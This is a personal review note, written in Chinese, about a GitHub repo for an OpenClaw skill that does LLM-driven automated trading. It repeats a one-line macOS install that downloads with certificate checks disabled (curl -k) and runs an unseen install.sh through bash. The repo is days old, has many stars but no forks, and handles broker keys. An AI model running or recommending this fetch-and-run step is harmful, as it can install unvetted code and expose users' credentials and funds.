---
repo: helenigtxu/TradingView-Claw
url: https://github.com/helenigtxu/TradingView-Claw
owner: helenigtxu
owner_type: User
language: Python
license: MIT
description: ""
homepage: ""
stars: 318
stars_per_day: 80
forks: 0
open_issues: 0
created: 2026-03-06
pushed_at: 2026-03-09
first_seen: 2026-03-10
week: "2026-W11"
category: "開發工具"
release_tag: ""
install_complexity: "easy"
status: to-review
my_rating: 0
last_reviewed: 2026-03-10
tags:
  - github
  - 開發工具
  - python
  - ai_auto_trading
  - ai_trading
  - ai_trading_bots
  - al_trading
  - bot_trading
aliases:
  - "TradingView-Claw"
  - "helenigtxu/TradingView-Claw"
  - "透過 LLM 驅動的技術分析，自動執行交易並追蹤市場動態。"
---

# TradingView-Claw

**318** stars · **80** stars/天 · 建立 4 天前 · Python · MIT

`個人專案` `easy-install`

> [!summary] 一句話摘要
> 透過 LLM 驅動的技術分析，自動執行交易並追蹤市場動態。

> [!abstract] 核心創新
> 使用 LLM 驅動的技術分析來過濾並識別高信心的交易信號。

## 專案簡介

這個專案讓用戶能夠透過命令行介面進行交易，並使用 LLM 進行技術分析來發現交易機會。它結合了多種功能，包括查詢市場趨勢、執行買賣指令和追蹤持倉，並且能夠連接多個經紀商的 API。與其他交易工具相比，TradingView-Claw 的獨特之處在於其信號發現功能，能夠過濾出統計意義的交易信號，並提供不同信號強度的分級。實際使用中，這個工具能夠快速提供市場資訊，但也需要用戶具備一定的交易知識。整體來說，這是一個適合中階到進階交易者的工具，值得在實驗性質的交易中試用。

**技術棧**：`Python` · `Shell` · `JavaScript`

## 重點功能

- 提供即時市場趨勢和技術指標查詢。
- 支持根據技術信號自動執行交易。
- 能夠追蹤開放的持倉並顯示實時盈虧。
- 支持多種經紀商的 API 連接。
- 過濾並分析高信心的交易信號。

## 快速開始

1. 安裝 TradingView-Claw
```bash
curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main && bash install.sh
```
2. 連接經紀商 API
```bash
tvclaw account connect
```
3. 查詢市場趨勢
```bash
tvclaw charts trending
```

## 為什麼值得關注

> [!tip] 爆紅原因
> 作者在交易和技術分析領域有豐富經驗，這個工具正好滿足了對於自動化交易的需求。隨著市場對於自動化交易的興趣增加，這個專案的曝光率也隨之上升。特別是在近期市場波動加劇的情況下，更多交易者尋求有效的工具來提升交易效率。

## 適合誰使用

**目標受眾**：對自動化交易有興趣的中階至進階交易者。

> [!example] 使用場景
> - 交易者 使用它來 自動執行交易，因為 可以根據技術信號快速反應市場變化。
> - 分析師 使用它來 追蹤市場趨勢，因為 能夠即時獲取各種技術指標。
> - 新手交易者 使用它來 學習交易策略，因為 提供清晰的指令和即時反饋。

## 架構分析

這是一個命令行工具，使用 Python 作為核心語言，並通過 API 與經紀商進行交互，實現交易功能和市場數據查詢。

## 優缺點分析

> [!success] 優點
> - 提供即時的市場分析和交易執行功能。
> - 簡單的安裝過程，適合快速上手。
> - 能夠連接多個經紀商的 API，靈活性高。

> [!danger] 缺點
> - 僅限於 macOS 使用，限制了使用者範圍。
> - 不提供金融建議，使用者需自行承擔風險。
> - 功能較為基礎，對於專業交易者可能不夠全面。

> [!warning] 注意事項
> - 僅適用於 macOS 環境。
> - 需要用戶具備基本的交易知識。
> - 不提供金融建議，使用風險自負。

## 類似工具比較

| 工具 | 差異 |
| --- | --- |
| MetaTrader | MetaTrader 提供更完整的圖表工具和社群支持，但不具備 LLM 驅動的技術分析功能。 |
| TradingView | TradingView 提供豐富的圖表功能，但缺乏自動交易執行的能力。 |

## 技術細節

| 欄位 | 值 |
| --- | --- |
| Forks | 0 |
| Open Issues | 0 |
| 最後推送 | 2026-03-09 |
| 建立日期 | 2026-03-06 |
| Repo 大小 | 90 KB |

> [!info]- 語言組成
> ```mermaid
> pie title 語言組成
>     "Python" : 77
>     "Shell" : 12
>     "JavaScript" : 10
> ```

> [!info]- 主要貢獻者
> | 貢獻者 | Commits |
> | --- | --- |
> | [@helenigtxu](https://github.com/helenigtxu) | 3 |

## README 摘錄

> [!info]- 展開查看原文 README
> # TradingView-Claw
> 
> **Trading-enabled TradingView skill for OpenClaw.**
> 
> Browse charts, execute trades based on technical signals, track positions, and discover opportunities using LLM-powered technical analysis. Full trading capability via broker integrations and exchange APIs.
> 
> > **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading financial markets involves risk of loss. This code has not been audited. Use at your own risk and only with funds you can afford to lose.
> 
> ---
> 
> ## ⚡ Install on macOS — one command
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> ---
> 
> ## Features
> 
> ### Chart & Market Data
> 
> * `tvclaw charts trending` — Top trending tickers by volume
> * `tvclaw charts search "query"` — Search symbols by keyword
> * `tvclaw chart ` — Symbol details with OHLCV + indicators
> 
> ### Trading
> 
> * `tvclaw buy  ` — Open long position
> * `tvclaw sell  ` — Open short position
> * Signal-driven execution (RSI, MACD, Bollinger Bands analysis)
> 
> ### Position Tracking
> 
> * `tvclaw positions` — List open positions with live P&L
> * `tvclaw position ` — Detailed position view
> * Positions tracked locally in `~/.openclaw/tvclaw/positions.json`
> 
> ### Wallet / Account Management
> 
> * `tvclaw account status` — Show balance and account info
> * `tvclaw account connect` — Connect broker/exchange API (one-time setup)
> 
> ### Signal Discovery
> 
> * `tvclaw signal scan` — Scan trending symbols for trade signals
> * `tvclaw signal scan --query "topic"` — Scan symbols matching a query
> * `tvclaw signal analyze  ` — Compare signal strength between two symbols
> 
> Uses LLM-powered technical analysis to identify high-confidence setups. Only statistically meaningful signals are accepted — noise and weak correlations are filtered out.
> 
> **Signal tiers:** S1 (≥95% confluence), S2 (90–95%), S3 (85–90%)
> 
> ---
> 
> ## Quick Start
> 
> ### 1. Install
> 
> **macOS (recommended) — one command:**
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> **Manual install:**
> 
> ```bash
> cp -r TradingView-Claw ~/.openclaw/skills/
> cd ~/.openclaw/skills/TradingView-Claw
> uv sync
> ```
> 
> **Via ClawHub:**
> 
> ```bash
> clawhub install tvclaw
> cd ~/.openclaw/skills/tvclaw
> uv sync

## 延伸閱讀

相關概念：[[自動化交易]] · [[技術分析]] · [[API 整合]]

[GitHub](https://github.com/helenigtxu/TradingView-Claw)


---

## 個人筆記

> [!question]+ 我的想法
> _在此寫下你的想法、使用心得、跟其他工具的比較..._

**狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`

## 出現記錄

- [[2026-03-10|2026-03-10]] — 首次收錄，317 stars
